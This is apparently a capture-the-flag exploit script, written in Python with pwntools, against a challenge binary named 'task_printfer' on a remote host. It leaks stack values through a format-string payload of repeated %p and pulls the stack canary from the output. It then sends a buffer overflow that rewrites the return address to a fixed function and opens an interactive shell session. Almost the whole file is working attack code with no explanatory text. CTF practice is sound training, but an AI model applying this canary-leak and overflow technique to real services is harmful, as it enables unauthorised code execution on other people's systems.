#!/usr/bin/env python3
from pwn import *

exe = context.binary = ELF('task_printfer')

host = args.HOST or '109.233.56.90'
port = int(args.PORT or 11589)

def start_local(argv=[], *a, **kw):
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    io = connect(host, port)
    if args.GDB:
        gdb.attach(io, gdbscript=gdbscript)
    return io

def start(argv=[], *a, **kw):
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

#===========================================================
#                    EXPLOIT GOES HERE
#===========================================================
# Arch:     amd64-64-little
# RELRO:    Partial RELRO
# Stack:    Canary found
# NX:       NX enabled
# PIE:      No PIE (0x400000)

io = start()

io.recvuntil(b'Say your name:\n')
pl = b"AAAABBBB%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p"
io.sendline(pl)

io.recvuntil(b'Welcome, ')
stack = io.recvuntil(b'!\n')[:-2]
stack = stack.split(b"0x")

canary = int(stack[14].strip(b"(nil)"), 16)

pl = cyclic(136)
pl += p64(canary)
pl += p64(0xdead)
pl += p64(0x400885)

io.recvuntil(b'Now enter your message:\n')
io.sendline(pl)

io.interactive()

